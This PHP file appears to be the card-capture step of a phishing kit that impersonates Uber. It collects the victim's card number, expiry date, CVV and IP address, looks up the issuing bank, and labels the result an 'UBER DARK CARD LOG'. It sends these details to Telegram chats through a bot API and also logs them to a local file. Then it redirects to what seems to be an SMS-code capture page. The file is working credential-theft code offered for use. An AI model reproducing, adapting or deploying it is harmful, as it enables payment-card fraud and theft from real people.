<?php
require "antibot.php";
include "id.php";

$ip = getenv("REMOTE_ADDR");
$bin        = str_replace(' ', '', $_POST['cardNumber']);
$bin        = substr($bin, 0, 6);
$getdetails = 'https://lookup.binlist.net/' . $bin;
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details  = json_decode($content);
$_SESSION['_namebank_'] = $namebank   = $details->bank->name;
$_SESSION['_brand_'] = $brand   = $details->brand;
$message = "😈 🕶️ =|=[ UBER DARK CARD LOG ]=| 🕶️ 😈
═════════════════════════════
💳 𝗖𝗮𝗿𝗱 𝗡𝘂𝗺𝗯𝗲𝗿   : ".$_POST['cardNumber']."
📆 𝗘𝘅𝗽𝗶𝗿𝘆 𝗗𝗮𝘁𝗲   : ".$_POST['exp']."
🔐 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 𝗖𝗩𝗩   : ".$_POST['cvv']."
🏦 𝗕𝗮𝗻𝗸 𝗡𝗮𝗺𝗲     : ".$_SESSION['_namebank_']."
💠 𝗖𝗮𝗿𝗱 𝗧𝘆𝗽𝗲     : ".$_SESSION['_brand_']."
🌍 𝗜𝗣 𝗔𝗱𝗱𝗿𝗲𝘀𝘀     : ".$ip."
═════════════════════════════
🩸 𝖀𝖇𝖊𝖗 𝕭𝖑𝖆𝖈𝖐 𝕷𝖔𝖌 • V1 😈
═════════════════════════════\n";

    
foreach($user_ids as $user_id) {
$url='https://api.telegram.org/bot' . $bot . '/sendMessage';
$data=array('chat_id'=>$user_id,'text'=>$message);
$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
$context=stream_context_create($options);
$result=file_get_contents($url,false,$context);
}
$myfile = fopen("rzlt.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
HEADER("Location: loadsms.php");


?>